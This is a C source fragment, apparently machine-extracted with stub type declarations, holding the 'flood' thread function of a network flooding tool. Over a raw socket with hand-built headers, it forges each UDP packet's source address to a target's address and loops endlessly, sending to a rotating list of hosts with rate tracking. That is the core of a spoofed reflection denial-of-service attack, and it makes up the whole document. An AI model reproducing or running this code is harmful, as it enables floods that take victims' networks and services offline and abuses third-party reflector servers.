
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


typedef int tmp ;
struct udphdr {int source; } ;
struct TYPE_4__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; } ;
struct thread_data {struct list* list_node; struct sockaddr_in sin; } ;
struct sockaddr {int dummy; } ;
struct TYPE_5__ {int s_addr; } ;
struct TYPE_6__ {TYPE_2__ sin_addr; } ;
struct list {TYPE_3__ data; struct list* next; } ;
struct iphdr {int tot_len; void* check; int id; int daddr; int saddr; } ;


 int IPPROTO_IP ;
 int IPPROTO_TCP ;
 int IP_HDRINCL ;
 int MAX_PACKET_SIZE ;
 int PF_INET ;
 int SOCK_RAW ;
 void* csum (unsigned short*,int) ;
 int exit (int) ;
 int fprintf (int ,char*) ;
 int htonl (int) ;
 int htons (int) ;
 int init_rand (int ) ;
 unsigned int limiter ;
 int memset (char*,int ,int) ;
 int pps ;
 int rand () ;
 int rand_cmwc () ;
 int sendto (int,char*,int,int ,struct sockaddr*,int) ;
 scalar_t__ setsockopt (int,int ,int ,int const*,int) ;
 int setup_ip_header (struct iphdr*) ;
 int setup_udp_header (struct udphdr*) ;
 int sleeptime ;
 int socket (int ,int ,int ) ;
 int stderr ;
 int time (int *) ;
 int usleep (int ) ;

void *flood(void *par1)
{
 struct thread_data *td = (struct thread_data *)par1;
 char datagram[MAX_PACKET_SIZE];
 struct iphdr *iph = (struct iphdr *)datagram;
 struct udphdr *udph = ( void *)iph + sizeof(struct iphdr);
 struct sockaddr_in sin = td->sin;
 struct list *list_node = td->list_node;
 int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 if(s < 0){
 fprintf(stderr, "Could not open raw socket.\n");
 exit(-1);
 }
 init_rand(time(((void*)0)));
 memset(datagram, 0, MAX_PACKET_SIZE);
 setup_ip_header(iph);
 setup_udp_header(udph);
 udph->source = htons(rand() % 65535 - 1026);
 iph->saddr = sin.sin_addr.s_addr;
 iph->daddr = list_node->data.sin_addr.s_addr;
 iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
 int tmp = 1;
 const int *val = &tmp;
 if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
 fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
 exit(-1);
 }
 init_rand(time(((void*)0)));
 register unsigned int i;
 i = 0;
 while(1){
  sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
  list_node = list_node->next;
  iph->daddr = list_node->data.sin_addr.s_addr;
  iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

  pps++;
  if(i >= limiter)
  {
   i = 0;
   usleep(sleeptime);
  }
  i++;
 }
}
